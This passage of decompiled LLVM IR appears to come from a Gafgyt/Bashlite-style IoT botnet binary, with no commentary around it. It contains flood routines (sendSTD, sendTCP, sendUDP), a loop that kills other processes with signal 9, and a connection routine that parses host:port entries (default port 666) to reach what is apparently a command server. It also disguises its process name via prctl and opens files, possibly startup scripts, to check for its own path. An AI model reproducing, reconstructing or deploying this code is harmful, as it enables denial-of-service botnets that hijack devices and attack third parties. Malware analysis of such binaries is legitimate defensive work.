  %v4_e07c = call i32 @sendSTD(i32 %v2_df9c, i32 %v1_dfb4, i32 %v1_dfd0, i32 0)
  %v1_e084 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_e088

dec_label_pc_e088:                                ; preds = %dec_label_pc_e03c, %dec_label_pc_dff8, %dec_label_pc_df24, %dec_label_pc_e070
  %v2_e08c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1c370.241 to i32), i32* @r1, align 4
  %v3_e098 = inttoptr i32 %v2_e08c to i8*
  %v4_e098 = call i32 @__GI_strcoll(i8* %v3_e098, i32 ptrtoint ([9 x i8]* @global_var_1c370.241 to i32))
  store i32 %v4_e098, i32* @r0, align 4
  %v2_e0a0 = icmp eq i32 %v4_e098, 0
  br i1 %v2_e0a0, label %dec_label_pc_e0a8, label %dec_label_pc_e1a0

dec_label_pc_e0a8:                                ; preds = %dec_label_pc_e088
  br label %dec_label_pc_e14c

dec_label_pc_e0bc:                                ; preds = %dec_label_pc_e14c, %dec_label_pc_e180
  %v3_e0c0 = mul i32 %storemerge9, 4
  %v2_e0cc = load i32, i32* @global_var_2c708.64, align 4
  %v2_e0d0 = add i32 %v2_e0cc, %v3_e0c0
  %v1_e0d4 = inttoptr i32 %v2_e0d0 to i32*
  %v2_e0d4 = load i32, i32* %v1_e0d4, align 4
  %v2_e0d8 = icmp eq i32 %v2_e0d4, 0
  br i1 %v2_e0d8, label %dec_label_pc_e140, label %dec_label_pc_e0e0

dec_label_pc_e0e0:                                ; preds = %dec_label_pc_e0bc
  %v2_e0f8 = load i32, i32* %v1_e0d4, align 4
  %v0_e0fc = call i32 @__GI_getpid()
  store i32 %v0_e0fc, i32* @r0, align 4
  %v9_e104 = icmp eq i32 %v2_e0f8, %v0_e0fc
  br i1 %v9_e104, label %dec_label_pc_e140, label %dec_label_pc_e10c

dec_label_pc_e10c:                                ; preds = %dec_label_pc_e0e0
  %v2_e11c = load i32, i32* @global_var_2c708.64, align 4
  %v2_e120 = add i32 %v2_e11c, %v3_e0c0
  %v1_e124 = inttoptr i32 %v2_e120 to i32*
  %v2_e124 = load i32, i32* %v1_e124, align 4
  %v2_e130 = call i32 @kill(i32 %v2_e124, i32 9)
  store i32 %v2_e130, i32* @r0, align 4
  %v1_e138 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_e140

dec_label_pc_e140:                                ; preds = %dec_label_pc_e0e0, %dec_label_pc_e0bc, %dec_label_pc_e10c
  %v1_e1a827 = phi i32 [ %v1_e1a828, %dec_label_pc_e0bc ], [ %v0_e0fc, %dec_label_pc_e0e0 ], [ %v2_e130, %dec_label_pc_e10c ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_e0bc ], [ %stack_var_-48.1, %dec_label_pc_e0e0 ], [ %v1_e138, %dec_label_pc_e10c ]
  %v1_e144 = add i32 %storemerge9, 1
  br label %dec_label_pc_e14c

dec_label_pc_e14c:                                ; preds = %dec_label_pc_e0a8, %dec_label_pc_e140
  %v1_e1a828 = phi i32 [ 0, %dec_label_pc_e0a8 ], [ %v1_e1a827, %dec_label_pc_e140 ]
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_e0a8 ], [ %stack_var_-48.0, %dec_label_pc_e140 ]
  %storemerge9 = phi i32 [ 0, %dec_label_pc_e0a8 ], [ %v1_e144, %dec_label_pc_e140 ]
  %v5_e164 = load i32, i32* @global_var_264a4.62, align 4
  %v9_e178 = icmp eq i32 %v5_e164, 0
  br i1 %v9_e178, label %dec_label_pc_e180, label %dec_label_pc_e0bc

dec_label_pc_e180:                                ; preds = %dec_label_pc_e14c
  %v2_e164 = load i32, i32* @global_var_264a0.61, align 4
  %tmp84 = icmp ugt i32 %v2_e164, %storemerge9
  br i1 %tmp84, label %dec_label_pc_e0bc, label %dec_label_pc_e1a0

dec_label_pc_e1a0:                                ; preds = %dec_label_pc_dbe4, %dec_label_pc_e180, %dec_label_pc_db7c, %dec_label_pc_df70, %dec_label_pc_dd38, %dec_label_pc_da08, %dec_label_pc_d7a4, %dec_label_pc_e060, %dec_label_pc_e088, %dec_label_pc_dc08, %dec_label_pc_d7c8, %dec_label_pc_d6f0, %dec_label_pc_df50, %dec_label_pc_df44, %dec_label_pc_dd0c, %dec_label_pc_dce0, %dec_label_pc_dcc0, %dec_label_pc_dca0, %dec_label_pc_dc80, %dec_label_pc_dc74, %dec_label_pc_d9dc, %dec_label_pc_d9b4, %dec_label_pc_d994, %dec_label_pc_d974, %dec_label_pc_d954, %dec_label_pc_d934, %dec_label_pc_d914, %dec_label_pc_d908, %dec_label_pc_d784, %dec_label_pc_d778, %dec_label_pc_d69c, %entry, %dec_label_pc_d728
  %v1_e1a8 = phi i32 [ %v1_df80, %dec_label_pc_df70 ], [ %v1_dd48, %dec_label_pc_dd38 ], [ %v1_da18, %dec_label_pc_da08 ], [ %v1_d7b4, %dec_label_pc_d7a4 ], [ %v0_e060, %dec_label_pc_e060 ], [ %v4_e098, %dec_label_pc_e088 ], [ %v0_dc08, %dec_label_pc_dc08 ], [ %v0_d7c8, %dec_label_pc_d7c8 ], [ 0, %dec_label_pc_d6f0 ], [ %v1_df60, %dec_label_pc_df50 ], [ 0, %dec_label_pc_df44 ], [ %v1_dd1c, %dec_label_pc_dd0c ], [ %v1_dcf0, %dec_label_pc_dce0 ], [ %v1_dcd0, %dec_label_pc_dcc0 ], [ %v1_dcb0, %dec_label_pc_dca0 ], [ %v1_dc90, %dec_label_pc_dc80 ], [ 0, %dec_label_pc_dc74 ], [ %v1_d9ec, %dec_label_pc_d9dc ], [ %v1_d9c4, %dec_label_pc_d9b4 ], [ %v1_d9a4, %dec_label_pc_d994 ], [ %v1_d984, %dec_label_pc_d974 ], [ %v1_d964, %dec_label_pc_d954 ], [ %v1_d944, %dec_label_pc_d934 ], [ %v1_d924, %dec_label_pc_d914 ], [ 0, %dec_label_pc_d908 ], [ %v1_d794, %dec_label_pc_d784 ], [ 0, %dec_label_pc_d778 ], [ 0, %dec_label_pc_d69c ], [ 0, %entry ], [ %v0_d700, %dec_label_pc_d728 ], [ 0, %dec_label_pc_db7c ], [ %v1_e1a828, %dec_label_pc_e180 ], [ 0, %dec_label_pc_dbe4 ]
  store i32 %v3_d624, i32* @r4, align 4
  store i32 %v6_d624, i32* @r5, align 4
  store i32 %v9_d624, i32* @r6, align 4
  store i32 %v12_d624, i32* @r7, align 4
  store i32 %v15_d624, i32* @r8, align 4
  store i32 %v18_d624, i32* @fp, align 4
  ret i32 %v1_e1a8

; uselistorder directives
  uselistorder i32 %stack_var_-48.1, { 0, 2, 1 }
  uselistorder i32 %v3_e0c0, { 1, 0 }
  uselistorder i32 %v2_e044, { 2, 1, 0 }
  uselistorder i32 %v1_dfd0, { 1, 0 }
  uselistorder i32 %v1_dfb4, { 1, 0 }
  uselistorder i32 %v2_df9c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_dec4, { 2, 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v1_ddb4, { 1, 0 }
  uselistorder i32 %v1_dd98, { 1, 0 }
  uselistorder i32 %v1_dd7c, { 1, 0 }
  uselistorder i32 %v2_dd64, { 1, 0, 3, 2 }
  uselistorder i32 %v1_dcd0, { 1, 0 }
  uselistorder i32 %v1_dcb0, { 1, 0 }
  uselistorder i32 %v1_dc90, { 1, 0 }
  uselistorder i32 %v2_dbec, { 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %v1_da84, { 1, 0 }
  uselistorder i32 %v1_da68, { 1, 0 }
  uselistorder i32 %v1_da4c, { 1, 0 }
  uselistorder i32 %v2_da34, { 1, 0, 3, 2 }
  uselistorder i32 %v1_d984, { 1, 0 }
  uselistorder i32 %v1_d964, { 1, 0 }
  uselistorder i32 %v1_d944, { 1, 0 }
  uselistorder i32 %v1_d924, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 5, 6, 7, 4, 8, 9, 10, 11, 3, 12, 13, 14, 2, 1, 0, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1c304.206 to i32), { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* @global_var_2c704.224, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_e1a0, { 1, 8, 7, 3, 12, 13, 4, 14, 15, 16, 17, 18, 19, 9, 0, 2, 5, 20, 21, 22, 23, 24, 25, 26, 27, 10, 6, 28, 29, 32, 11, 30, 31 }
  uselistorder label %dec_label_pc_e14c, { 1, 0 }
  uselistorder label %dec_label_pc_e140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e0bc, { 1, 0 }
  uselistorder label %dec_label_pc_e088, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e03c, { 1, 0 }
  uselistorder label %dec_label_pc_e014, { 1, 0 }
  uselistorder label %dec_label_pc_df24, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_debc, { 1, 0 }
  uselistorder label %dec_label_pc_de78, { 1, 0 }
  uselistorder label %dec_label_pc_de38, { 1, 0 }
  uselistorder label %dec_label_pc_de00, { 1, 0 }
  uselistorder label %dec_label_pc_dd5c, { 1, 0 }
  uselistorder label %dec_label_pc_dc54, { 1, 0 }
  uselistorder label %dec_label_pc_dbe4, { 1, 0 }
  uselistorder label %dec_label_pc_db98, { 1, 0 }
  uselistorder label %dec_label_pc_db58, { 1, 0 }
  uselistorder label %dec_label_pc_db20, { 1, 0 }
  uselistorder label %dec_label_pc_dadc, { 1, 0 }
  uselistorder label %dec_label_pc_da2c, { 1, 0 }
  uselistorder label %dec_label_pc_d8e8, { 1, 0 }
  uselistorder label %dec_label_pc_d758, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d6cc, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_e1ec = load i32, i32* @fp, align 4
  store i32 57844, i32* %stack_var_-4, align 4
  %v2_e1f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e1f0, i32* @fp, align 4
  %v2_e204 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_e214 = bitcast i32* %stack_var_-4116 to i8*
  %v3_e214 = call i32 @__GI_memset(i8* %v2_e214, i32 0)
  %v2_e21c = load i32, i32* @global_var_26498.45, align 4
  %v2_e220 = icmp eq i32 %v2_e21c, 0
  br i1 %v2_e220, label %dec_label_pc_e244, label %dec_label_pc_e228

dec_label_pc_e228:                                ; preds = %entry
  %v1_e234 = call i32 @__GI_close(i32 %v2_e21c)
  store i32 0, i32* @global_var_26498.45, align 4
  br label %dec_label_pc_e244

dec_label_pc_e244:                                ; preds = %entry, %dec_label_pc_e228
  %v2_e248 = load i32, i32* @global_var_26170.246, align 4
  %v2_e24c = icmp eq i32 %v2_e248, 0
  br i1 %v2_e24c, label %dec_label_pc_e278, label %dec_label_pc_e264

dec_label_pc_e264:                                ; preds = %dec_label_pc_e244
  %v1_e26c = add i32 %v2_e248, 1
  br label %dec_label_pc_e278

dec_label_pc_e278:                                ; preds = %dec_label_pc_e244, %dec_label_pc_e264
  %storemerge1 = phi i32 [ %v1_e26c, %dec_label_pc_e264 ], [ 0, %dec_label_pc_e244 ]
  store i32 %storemerge1, i32* @global_var_26170.246, align 4
  %v4_e290 = mul i32 %storemerge1, 4
  %v5_e290 = add i32 %v4_e290, ptrtoint ([21 x i8]** @global_var_26120.248 to i32)
  %v6_e290 = inttoptr i32 %v5_e290 to i32*
  %v7_e290 = load i32, i32* %v6_e290, align 4
  store i32 %v7_e290, i32* @r1, align 4
  %v3_e29c = call i32 @strcpy(i8* %v2_e214, i32 %v7_e290)
  store i32 %v2_e204, i32* @r0, align 4
  %v2_e2c0 = call i32 @__GI_strchr(i32 %v2_e204, i32 58)
  %v2_e2c8 = icmp eq i32 %v2_e2c0, 0
  br i1 %v2_e2c8, label %dec_label_pc_e328, label %dec_label_pc_e2d0

dec_label_pc_e2d0:                                ; preds = %dec_label_pc_e278
  store i32 %v2_e204, i32* @r0, align 4
  %v2_e2e4 = call i32 @__GI_strchr(i32 %v2_e204, i32 58)
  %v1_e2ec = add i32 %v2_e2e4, 1
  store i32 %v1_e2ec, i32* @r0, align 4
  %v1_e2f4 = call i32 @atol(i32 %v1_e2ec)
  store i32 %v2_e204, i32* @r0, align 4
  %v2_e314 = call i32 @__GI_strchr(i32 %v2_e204, i32 58)
  %v3_e324 = inttoptr i32 %v2_e314 to i8*
  store i8 0, i8* %v3_e324, align 1
  br label %dec_label_pc_e328

dec_label_pc_e328:                                ; preds = %dec_label_pc_e278, %dec_label_pc_e2d0
  %stack_var_-20.0 = phi i32 [ 666, %dec_label_pc_e278 ], [ %v1_e2f4, %dec_label_pc_e2d0 ]
  %v3_e334 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_e334, i32* @global_var_26498.45, align 4
  %v4_e368 = call i32 @connectTimeout(i32 %v3_e334, i32 %v2_e204, i32 %stack_var_-20.0, i32 30)
  %v2_e370 = icmp eq i32 %v4_e368, 0
  %. = zext i1 %v2_e370 to i32
  store i32 %v3_e1ec, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_e204, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_e328, { 1, 0 }
  uselistorder label %dec_label_pc_e278, { 1, 0 }
  uselistorder label %dec_label_pc_e244, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e3bc = load i32, i32* @fp, align 4
  store i32 %v3_e3bc, i32* %stack_var_-16, align 4
  %v3_e3d8 = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_e3e8 = icmp eq i32 %v3_e3d8, -1
  br i1 %v3_e3e8, label %dec_label_pc_e3f0, label %dec_label_pc_e400

dec_label_pc_e3f0:                                ; preds = %entry
  br label %dec_label_pc_e63c

dec_label_pc_e400:                                ; preds = %entry
  %v2_e400 = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  %v2_e410 = bitcast i32* %stack_var_-52 to i8*
  %v3_e410 = call i32 @__GI_memset(i8* %v2_e410, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1c37c.250 to i32), i32* @r0, align 4
  %v2_e420 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1c37c.250 to i32))
  %v1_e430 = call i32 @__GI_htons(i32 53)
  %v3_e44c = call i32 @__libc_connect(i32 %v3_e3d8, i32 %v2_e400, i32 16)
  %v3_e45c = icmp eq i32 %v3_e44c, -1
  br i1 %v3_e45c, label %dec_label_pc_e464, label %dec_label_pc_e474

dec_label_pc_e464:                                ; preds = %dec_label_pc_e400
  br label %dec_label_pc_e63c

dec_label_pc_e474:                                ; preds = %dec_label_pc_e400
  store i32 16, i32* %stack_var_-72, align 4
  %v2_e47c = ptrtoint i32* %stack_var_-68 to i32
  %v2_e480 = ptrtoint i32* %stack_var_-72 to i32
  %v5_e48c = call i32 @__GI_getsockname(i32 %v3_e3d8, i32 %v2_e47c, i32 %v2_e480, i32 %v2_e47c, i32 16)
  %v3_e49c = icmp eq i32 %v5_e48c, -1
  br i1 %v3_e49c, label %dec_label_pc_e4a4, label %dec_label_pc_e4b4

dec_label_pc_e4a4:                                ; preds = %dec_label_pc_e474
  br label %dec_label_pc_e63c

dec_label_pc_e4b4:                                ; preds = %dec_label_pc_e474
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_2c6fc.77 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_2c6fc.77, align 4
  %v3_e4c8 = call i32 @__GI_open(i32 ptrtoint ([16 x i8]* @global_var_1c384.253 to i32), i32 0)
  %v2_e560 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_e558

dec_label_pc_e4d8:                                ; preds = %dec_label_pc_e558
  %v8_e4ec = call i32 @strstr(i32 %v2_e560, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c394.255, i32 0, i32 0), i32 %v3_e4c8, i32 %v2_e560, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_e4f4 = icmp eq i32 %v8_e4ec, 0
  br i1 %v2_e4f4, label %dec_label_pc_e53c, label %dec_label_pc_e51c.preheader

dec_label_pc_e51c.preheader:                      ; preds = %dec_label_pc_e4d8
  %v2_e5209 = load i8, i8* %stack_var_-4168, align 1
  %v7_e52413 = icmp eq i8 %v2_e5209, 9
  br i1 %v7_e52413, label %dec_label_pc_e52c, label %dec_label_pc_e510

dec_label_pc_e510:                                ; preds = %dec_label_pc_e51c.preheader, %dec_label_pc_e510
  %v4_e51c14 = phi i32 [ %v1_e514, %dec_label_pc_e510 ], [ %v2_e560, %dec_label_pc_e51c.preheader ]
  %v1_e514 = add i32 %v4_e51c14, 1
  %v5_e518 = inttoptr i32 %v1_e514 to i8*
  %v2_e520 = load i8, i8* %v5_e518, align 1
  %v7_e524 = icmp eq i8 %v2_e520, 9
  br i1 %v7_e524, label %dec_label_pc_e52c, label %dec_label_pc_e510

dec_label_pc_e52c:                                ; preds = %dec_label_pc_e510, %dec_label_pc_e51c.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_e51c.preheader ], [ %v5_e518, %dec_label_pc_e510 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_e580

dec_label_pc_e53c:                                ; preds = %dec_label_pc_e4d8
  store i32 4096, i32* @r2, align 4
  %v3_e554 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_e558

dec_label_pc_e558:                                ; preds = %dec_label_pc_e4b4, %dec_label_pc_e53c
  %v4_e570 = call i32 @fdgets(i32 %v2_e560, i32 4096, i32 %v3_e4c8, i32 %v2_e560)
  %v2_e578 = icmp eq i32 %v4_e570, 0
  br i1 %v2_e578, label %dec_label_pc_e580, label %dec_label_pc_e4d8

dec_label_pc_e580:                                ; preds = %dec_label_pc_e558, %dec_label_pc_e52c
  %v1_e584 = call i32 @__GI_close(i32 %v3_e4c8)
  %v4_e594 = load i8, i8* %stack_var_-4168, align 1
  %v2_e598 = icmp eq i8 %v4_e594, 0
  br i1 %v2_e598, label %dec_label_pc_e630, label %dec_label_pc_e5a0

dec_label_pc_e5a0:                                ; preds = %dec_label_pc_e580
  %v2_e5a8 = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_e560, i32* @r1, align 4
  %v2_e5c0 = bitcast i32* %stack_var_-4200 to i8*
  %v3_e5c0 = call i32 @strcpy(i8* %v2_e5c0, i32 %v2_e560)
  store i32 %v2_e5a8, i32* @r3, align 4
  %v3_e5e0 = call i32 @ioctl(i32 %v3_e3d8, i32 35111, i32 %v2_e5a8)
  %v2_e600 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_e5f0

dec_label_pc_e5f0:                                ; preds = %dec_label_pc_e5a0, %dec_label_pc_e5f0
  %storemerge47 = phi i32 [ 0, %dec_label_pc_e5a0 ], [ %v1_e61c, %dec_label_pc_e5f0 ]
  %v2_e608 = add i32 %storemerge47, %v2_e600
  %v1_e60c = inttoptr i32 %v2_e608 to i8*
  %v2_e60c = load i8, i8* %v1_e60c, align 1
  %v4_e614 = add i32 %storemerge47, ptrtoint (i32* @global_var_264a8.257 to i32)
  %v5_e614 = inttoptr i32 %v4_e614 to i8*
  store i8 %v2_e60c, i8* %v5_e614, align 1
  %v1_e61c = add nuw nsw i32 %storemerge47, 1
  %v7_e62c = icmp slt i32 %v1_e61c, 6
  br i1 %v7_e62c, label %dec_label_pc_e5f0, label %dec_label_pc_e630

dec_label_pc_e630:                                ; preds = %dec_label_pc_e5f0, %dec_label_pc_e580
  %v1_e634 = call i32 @__GI_close(i32 %v3_e3d8)
  %v3_e650.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e64c

dec_label_pc_e63c:                                ; preds = %dec_label_pc_e4a4, %dec_label_pc_e464, %dec_label_pc_e3f0
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e64c

dec_label_pc_e64c:                                ; preds = %dec_label_pc_e630, %dec_label_pc_e63c
  %v3_e650 = phi i32 [ %v3_e650.pre, %dec_label_pc_e630 ], [ 0, %dec_label_pc_e63c ]
  %v2_e658 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e658, i32* @fp, align 4
  ret i32 %v3_e650

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_e514, { 1, 0 }
  uselistorder i32 %v2_e560, { 2, 1, 3, 6, 0, 5, 4 }
  uselistorder i32 %v3_e3d8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @__GI_htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e64c, { 1, 0 }
  uselistorder label %dec_label_pc_e5f0, { 1, 0 }
  uselistorder label %dec_label_pc_e558, { 1, 0 }
  uselistorder label %dec_label_pc_e510, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([6 x i8]* @global_var_1c3a0.259 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e69c = load i32, i32* @r4, align 4
  store i32 %v3_e69c, i32* %stack_var_-24, align 4
  store i32 59044, i32* %stack_var_-4, align 4
  %v19_e69c = ptrtoint i32* %stack_var_-24 to i32
  %v2_e6a0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e6a0, i32* @fp, align 4
  %v1_e6e4 = bitcast i8** %argv to i32*
  %v2_e6e4 = load i32, i32* %v1_e6e4, align 4
  store i32 %v2_e6e4, i32* @r4, align 4
  %v2_e6fc = load i32, i32* %v1_e6e4, align 4
  %v1_e700 = inttoptr i32 %v2_e6fc to i8*
  %v3_e704 = call i32 @strlen(i8* %v1_e700)
  %v0_e70c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1c3a8.261 to i32), i32* @r1, align 4
  %v3_e718 = call i32 @strncpy(i32 %v0_e70c, i32 ptrtoint (i32* @global_var_1c3a8.261 to i32), i32 %v3_e704)
  store i32 ptrtoint (i32* @global_var_1c3a8.261 to i32), i32* %v1_e6e4, align 4
  %v5_e754 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_1c3a8.261 to i32), i32 0, i32 0, i32 0)
  %v2_e75c = call i32 @__GI_time(i32* null)
  store i32 %v2_e75c, i32* @r0, align 4
  store i32 %v2_e75c, i32* @r4, align 4
  %v0_e764 = call i32 @__GI_getpid()
  %v0_e76c = load i32, i32* @r4, align 4
  %v2_e76c = xor i32 %v0_e76c, %v0_e764
  %v1_e774 = call i32 @srand(i32 %v2_e76c)
  %v2_e77c = call i32 @__GI_time(i32* null)
  store i32 %v2_e77c, i32* @r0, align 4
  store i32 %v2_e77c, i32* @r4, align 4
  %v0_e784 = call i32 @__GI_getpid()
  %v0_e78c = load i32, i32* @r4, align 4
  %v2_e78c = xor i32 %v0_e78c, %v0_e784
  %v1_e794 = call i32 @init_rand(i32 %v2_e78c)
  store i32 ptrtoint ([19 x i8]* @global_var_1c3ac.263 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1c3c0.265 to i32), i32* @r1, align 4
  %v3_e7b0 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1c3ac.263 to i32), i32 ptrtoint ([2 x i8]* @global_var_1c3c0.265 to i32))
  %v2_e7c0 = icmp eq i32 %v3_e7b0, 0
  br i1 %v2_e7c0, label %dec_label_pc_e7c8, label %dec_label_pc_e7e4

dec_label_pc_e7c8:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_1c3c4.267 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1c3c0.265 to i32), i32* @r1, align 4
  %v3_e7d8 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1c3c4.267 to i32), i32 ptrtoint ([2 x i8]* @global_var_1c3c0.265 to i32))
  br label %dec_label_pc_e7e4

dec_label_pc_e7e4:                                ; preds = %entry, %dec_label_pc_e7c8
  %stack_var_-88.0 = phi i32 [ %v3_e7d8, %dec_label_pc_e7c8 ], [ %v3_e7b0, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c3c4.267, i32 0, i32 0), %dec_label_pc_e7c8 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1c3ac.263, i32 0, i32 0), %entry ]
  %v2_e7e8 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_e7e8, label %dec_label_pc_e980, label %dec_label_pc_e7f0

dec_label_pc_e7f0:                                ; preds = %dec_label_pc_e7e4
  %v2_e800 = load i32, i32* %v1_e6e4, align 4
  %v1_e804 = inttoptr i32 %v2_e800 to i8*
  %v3_e808 = call i32 @strlen(i8* %v1_e804)
  %v2_e81c = ptrtoint i32* %stack_var_-368 to i32
  %v2_e828 = call i32 @getcwd(i32 %v2_e81c, i32 256)
  store i32 ptrtoint (i32* @global_var_1c3d4.269 to i32), i32* @r1, align 4
  %v2_e838 = bitcast i32* %stack_var_-368 to i8*
  %v3_e838 = call i32 @__GI_strcoll(i8* %v2_e838, i32 ptrtoint (i32* @global_var_1c3d4.269 to i32))
  %v2_e840 = icmp eq i32 %v3_e838, 0
  br i1 %v2_e840, label %dec_label_pc_e978, label %dec_label_pc_e858

dec_label_pc_e84c:                                ; preds = %dec_label_pc_e858
  %v1_e850 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_e858

dec_label_pc_e858:                                ; preds = %dec_label_pc_e7f0, %dec_label_pc_e84c
  %stack_var_-84.0 = phi i32 [ %v1_e850, %dec_label_pc_e84c ], [ %v3_e808, %dec_label_pc_e7f0 ]
  %v2_e868 = load i32, i32* %v1_e6e4, align 4
  %v2_e870 = add i32 %v2_e868, %stack_var_-84.0
  %v1_e874 = inttoptr i32 %v2_e870 to i8*
  %v2_e874 = load i8, i8* %v1_e874, align 1
  %v7_e878 = icmp eq i8 %v2_e874, 47
  br i1 %v7_e878, label %dec_label_pc_e880, label %dec_label_pc_e84c

dec_label_pc_e880:                                ; preds = %dec_label_pc_e858
  %v2_e890 = load i32, i32* %v1_e6e4, align 4
  %v2_e898 = add i32 %v2_e890, %stack_var_-84.0
  %v2_e89c = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_e89c, i32* @r0, align 4
  %v8_e8b0 = call i32 @sprintf(i32 %v2_e89c, i32 ptrtoint ([8 x i8]* @global_var_1c3d8.271 to i32), i32 %v2_e81c, i32 %v2_e898, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_e90c = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_e8c0 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_e8ec = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_e908.outer

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e908
  %v3_e8d0 = call i32 @fgets(i32 %v2_e8c0, i32 1024, i32 %stack_var_-88.0)
  %v3_e8ec = call i32 @__GI_strcasecmp(i8* %v2_e8ec, i32 %v2_e89c)
  %v2_e8f4 = icmp eq i32 %v3_e8ec, 0
  br i1 %v2_e8f4, label %dec_label_pc_e8fc, label %dec_label_pc_e908

dec_label_pc_e8fc:                                ; preds = %dec_label_pc_e8b8
  %v1_e900 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_e908.outer

dec_label_pc_e908.outer:                          ; preds = %dec_label_pc_e8fc, %dec_label_pc_e880
  %stack_var_-80.0.ph = phi i32 [ %v1_e900, %dec_label_pc_e8fc ], [ 0, %dec_label_pc_e880 ]
